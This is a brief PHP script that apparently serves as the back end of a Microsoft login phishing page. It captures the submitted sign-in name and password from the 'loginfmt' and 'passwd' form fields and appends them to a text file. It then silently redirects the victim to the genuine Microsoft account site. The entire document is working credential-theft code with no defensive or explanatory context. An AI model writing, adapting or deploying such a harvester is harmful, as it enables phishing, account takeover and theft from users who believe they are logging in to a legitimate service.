<?php

file_put_contents("usernames.txt", "Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://account.microsoft.com/account');
exit();
